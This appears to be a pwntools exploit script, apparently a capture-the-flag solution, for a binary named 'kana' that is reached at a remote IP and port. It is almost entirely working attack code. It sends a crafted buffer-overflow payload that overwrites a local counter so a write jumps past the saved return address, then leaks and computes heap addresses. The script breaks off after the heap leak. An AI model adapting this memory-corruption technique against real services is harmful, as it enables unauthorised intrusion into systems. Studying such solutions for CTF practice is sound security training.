from pwn import *

exe = ELF("./kana")
#libc = ELF("./libc-2.35.so")
#ld = ELF("./ld-2.35.so")

context.binary = exe
context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter("ignore")

remote_url = "144.126.196.198"
remote_port = 31803
gdbscript = '''
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            # gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote(remote_url, remote_port)

    return r

r = conn()
r.sendlineafter(b'>> ', b'4')
r.sendlineafter(b'>> ', b'b'*0x20)

# Leak heap
# The a*'0x5c' and '\xaf' is a crafted payload that we can use
# to skip the option read by 0xaf bytes, so that we can leap over
# the saved RIP during triggering the buffer overflow bug.
#
# Basically, withh the BOF, we overwrite the v12 value to 0xaf, so that the next
# write after overwriting the v12 will skip some addressed and jump directly to aaddress
# below the saved RIP address.
r.sendlineafter(b'>> ', b'a'*0x5c+b'\xaf'*1 + b'c'*0x10)
r.recvuntil(b' : ')
out = r.recvline()
leaked_heap = u64(out[8:16])
log.info(f'leaked_heap = {hex(leaked_heap)}')
good_heap_offset = -0x23e8 # Contains stack address
target_heap = leaked_heap+good_heap_offset
log.info(f'target_heap = {hex(target_heap)}')

